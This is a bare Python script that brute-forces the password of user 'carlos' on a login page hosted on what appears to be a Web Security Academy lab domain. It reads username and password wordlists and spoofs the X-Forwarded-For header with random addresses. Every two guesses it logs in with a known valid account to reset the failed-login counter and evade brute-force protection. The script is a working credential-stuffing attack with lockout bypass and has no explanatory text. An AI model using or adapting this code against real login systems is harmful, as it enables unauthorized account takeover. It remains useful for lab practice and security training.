
import requests
import random

fd = open('usernames.txt','r')
wordlist = fd.read()
fd.close()

usernames = list(wordlist.split('\n'))
#print(usernames)

fd = open('passwords.txt','r')
wordlist = fd.read()
fd.close()

passwords = list(wordlist.split('\n'))
#print(passwords)

url ="https://ac641fa01fc34754c0472a3d0011002f.web-security-academy.net/login"

#username=carlos&password=admin

counter = 0

for i in passwords:

	if counter==2:
		data ={
			"username":"wiener",
			"password":"peter"
		}
		headers2 = {
		"X-Forwarded-For":"127.{}.{}.{}".format(random.randint(1,255),random.randint(1,255),random.randint(1,255))
		}

		r = requests.post(url,data=data,headers=headers2)
		counter = 0

	data2 = {
		"username":"carlos",
		"password":i
	}

	headers2 = {
		"X-Forwarded-For":"127.{}.{}.{}".format(random.randint(1,255),random.randint(1,255),random.randint(1,255))
	}


	r = requests.post(url,data=data2,headers=headers2)
	counter += 1
	if "Incorrect password" not in r.text:
		print("Found password for carlos : {}".format(i))
		print(r.text)
